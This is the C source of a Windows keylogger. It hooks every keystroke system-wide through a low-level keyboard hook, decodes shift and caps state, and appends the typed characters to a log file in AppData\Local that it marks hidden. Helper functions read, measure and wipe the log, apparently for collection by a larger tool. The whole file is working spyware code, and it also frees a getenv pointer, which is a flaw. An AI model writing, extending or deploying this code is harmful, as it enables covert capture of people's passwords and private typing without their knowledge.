#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "types.h"
#include "keylogger.h"
// 
uint8 key_dataPlus[KEY_DATAPLUS_LEN][3] = {  { 0x31, '1', '!' },
									{ 0x32, '2', '@' },
									{ 0x33, '3', '#' },
									{ 0x34, '4', '$' },
									{ 0x35, '5', '%' },
									{ 0x36, '6', '^' },
									{ 0x37, '7', '&' },
									{ 0x38, '8', '*' },
									{ 0x39, '9', '(' },
									{ 0x30, '0', ')' },
									{ 0xBD, '-', '_' },
									{ 0xBB, '=', '+' },
									{ 0xC0, '`', '~' },
									{ 0xDB, '[', '{' },
									{ 0xDD, ']', '}' },
									{ 0xBA, ';', ':' },
									{ 0xDE, '\'', '\"' },
									{ 0xDC, '\\', '|' },
									{ 0xE2, '\\', '|' },
									{ 0xBC, ',', '<' },
									{ 0xBE, '.', '>' },
									{ 0xBF, '/', '?' }
									};
int keylogger_isCtrlOn = 0;
int keylogger_isCapsOn = 0;
int keylogger_isShiftOn = 0;
int keylogger_IsRunning = 0;
char keylogger_CMD  = KEYLOGGER_CMD_NONE;
char* keylogger_path;
FILE *flog;

void keylogger_PrepareToRead(void)
{
	keylogger_CMD  = KEYLOGGER_CMD_BLOCK;

	fclose(flog);
	flog = fopen(keylogger_path, "rb");
}

uint64 keylogger_GetSize(void)
{
	keylogger_CMD  = KEYLOGGER_CMD_BLOCK;

	uint64 size = ftell(flog);

	keylogger_CMD  = KEYLOGGER_CMD_NONE;

	return size;
}

void keylogger_Clear(void)
{
	keylogger_CMD  = KEYLOGGER_CMD_BLOCK;

	fclose(flog);
	remove(keylogger_path);
	flog = fopen(keylogger_path, "a+");
	fseek(flog, 0, SEEK_END);
	
	if(ftell(flog) < 1)
	{
		SetFileAttributes(keylogger_path, FILE_ATTRIBUTE_HIDDEN);
	}

	fprintf(flog, "\n-={NEW}=-\n");

	keylogger_CMD  = KEYLOGGER_CMD_NONE;
}

int key_dataPlusGet(uint8 vkey)
{
	if(vkey == KEY_BACKSPACE || vkey == KEY_SPACE || vkey == KEY_TAP || vkey == KEY_ENTER)
	{
		return vkey;
	}
	
	int i;

	for(i = 0; i != KEY_DATAPLUS_LEN; i++)
	{
		if(key_dataPlus[i][0] == vkey)
		{
			if(keylogger_isShiftOn)
			{
				return key_dataPlus[i][KEY_DATAPLUS_ASCII_SHIFT];
			}

			return key_dataPlus[i][KEY_DATAPLUS_ASCII];
		}
	}

	return KEY_EMPTY; //ignored; not needed ctrl, alt, esc, page up, print screen...
}

LRESULT CALLBACK keyb_hook(int code, WPARAM wParam, LPARAM lParam)
{
	int specialKey = 0;
	uint8 pkey = KEY_EMPTY;

	KBDLLHOOKSTRUCT *pKeyb = (KBDLLHOOKSTRUCT *)lParam;

	if(keylogger_CMD  != KEYLOGGER_CMD_NONE)
	{
		return CallNextHookEx(NULL, code, wParam, lParam);
	}

	if(wParam == WM_KEYUP)
	{
		pkey = (uint8)pKeyb->vkCode & 0xFF;

		if(pkey == KEY_CAPS)
		{
			keylogger_isCapsOn = !keylogger_isCapsOn;
			specialKey = 1;
		}else if(pkey == KEY_SHIFT){
			keylogger_isShiftOn = 0;
			specialKey = 1;
		}else if(pkey == KEY_CTRL){
			keylogger_isCtrlOn = 0;
			specialKey = 1;
		}

		if(!specialKey && !keylogger_isCtrlOn)
		{
			if(pkey >= 'A' && pkey <= 'Z')
			{
				if(keylogger_isCapsOn && keylogger_isShiftOn)
                    {
                         pkey += 0x20;
                    }else if(!keylogger_isCapsOn && !keylogger_isShiftOn){
                         pkey += 0x20;
				}
			}else{
				pkey = key_dataPlusGet(pkey);
			}

			if(keylogger_CMD == KEYLOGGER_CMD_NONE && pkey != KEY_EMPTY)
			{
				fputc(pkey, flog);
				fflush(flog);
			}
		}
	}else if(wParam == WM_KEYDOWN){
		pkey = (uint8)pKeyb->vkCode & 0xFF;

		if(pkey == KEY_SHIFT)
		{
			keylogger_isShiftOn = 1;
		}else if(pkey == KEY_CTRL){
			keylogger_isCtrlOn = 1;
		}
	}

	return CallNextHookEx(NULL, code, wParam, lParam);
}

uint64 __stdcall keylogger_thread_loop(void* args)
{	
	MSG msg;
	HINSTANCE instc = GetModuleHandle(NULL);
	
	if(!SetWindowsHookEx(WH_KEYBOARD_LL, keyb_hook, instc, 0))
	{
		return 0;
	}
	
	keylogger_IsRunning = 1;

	if((GetKeyState(KEY_CAPS) & 0x0001) != 0)
	{
		keylogger_isCapsOn = 1;
	}

	while(!GetMessage(&msg, NULL, 0, 0))
	{
		if(keylogger_CMD  == KEYLOGGER_CMD_BLOCK)
		{
			KEYLOGGER_MSG_TIMER();

			continue;
		}

		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}

void keylogger_Start(void)
{
	char* prgPath = getenv("APPDATA");
	
	if(!prgPath)
	{
		return;
	}

	int pathLen = strlen(prgPath) + strlen(KEYLOGGER_FILE_NAME) + strlen("\\..\\Local\\") + sizeof(char);
	keylogger_path = malloc(pathLen);

	snprintf(keylogger_path, pathLen, "%s\\..\\Local\\%s", prgPath, KEYLOGGER_FILE_NAME);
	free(prgPath);

	flog = fopen(keylogger_path, "a+");
	fseek(flog, 0, SEEK_END);
	
	if(ftell(flog) < 1)
	{
		SetFileAttributes(keylogger_path, FILE_ATTRIBUTE_HIDDEN);
	}

	fprintf(flog, "\n-={NEW}=-\n");

	keylogger_CMD   = KEYLOGGER_CMD_NONE;
	CreateThread(NULL, 0, keylogger_thread_loop, NULL, 0, NULL);
}